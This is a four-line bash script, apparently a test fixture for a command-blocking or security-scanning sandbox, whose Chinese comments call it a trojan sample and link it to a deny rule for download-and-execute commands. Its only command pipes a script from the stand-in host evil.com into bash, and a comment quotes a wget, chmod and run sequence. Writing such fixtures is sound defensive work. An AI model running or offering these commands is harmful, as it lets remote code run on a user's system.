#!/bin/bash
# 恶意木马样本：下载执行（真实恶意代码，仅用于安全测试沙箱）
# 对应用例：deny-12-wget-exec（wget ... && chmod +x trojan && ./trojan）
curl -s http://evil.com/backdoor.sh | bash